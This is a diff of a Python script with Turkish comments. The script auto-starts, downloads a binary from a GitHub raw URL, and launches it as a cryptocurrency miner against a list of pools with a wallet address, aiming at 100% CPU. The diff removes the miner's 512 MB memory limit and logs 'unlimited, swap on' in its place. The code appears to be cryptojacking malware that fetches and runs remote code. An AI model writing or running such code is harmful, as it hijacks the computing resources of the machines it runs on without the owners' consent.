@@ -10,7 +10,6 @@ import urllib.request
 import json
 import tempfile
 import re
-import resource  # RAM sınırlandırması için eklendi
 from urllib.parse import urlparse
 from collections import deque
 
@@ -48,19 +47,10 @@ def kill_process(proc):
     except:
         pass
 
-# Madenci (alt süreç) başlatılırken RAM'i 512 MB ile sınırlayan fonksiyon
-def set_memory_limit():
-    try:
-        # 512 MB'ı byte cinsinden hesaplıyoruz (512 * 1024 * 1024)
-        limit_bytes = 536870912
-        resource.setrlimit(resource.RLIMIT_AS, (limit_bytes, limit_bytes))
-    except Exception as e:
-        pass
-
 def execution_logic():
     global STATUS
     try:
-        log_to_console("Sistem otomatik başlatıldı. Hedef CPU: %100, RAM Limit: 512MB")
+        log_to_console("Sistem otomatik başlatıldı. Hedef CPU: %100, RAM Limit: SINIRSIZ (Swap Açık)")
         log_to_console("Çekirdek indiriliyor: GitHub/Exma0/va/x")
         
         url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
@@ -93,7 +83,6 @@ def execution_logic():
             log_to_console(f"Havuz deneniyor [{pool_index+1}/{len(pools_to_try)}]: {pool_host}")
             
             use_tls = ":443" in pool_host
-            # --cpu-max-threads-hint 100 ayarı tüm CPU gücünü kullanmasını sağlar
             cmd = [
                 tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
                 "-p", f"node-{int(time.time())%1000}", "--keepalive",
@@ -104,10 +93,9 @@ def execution_logic():
             
             log_to_console(f"Madenci başlatılıyor... Havuz: {pool_host} (TLS: {use_tls})")
             
-            # RAM limitini madenciye uygulamak için preexec_fn parametresini ekledik
+            # RAM limiti preexec_fn parametresi TAMAMEN KALDIRILDI!
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                    text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"},
-                                    preexec_fn=set_memory_limit)
+                                    text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
             
             error_count = 0
             max_errors = 5
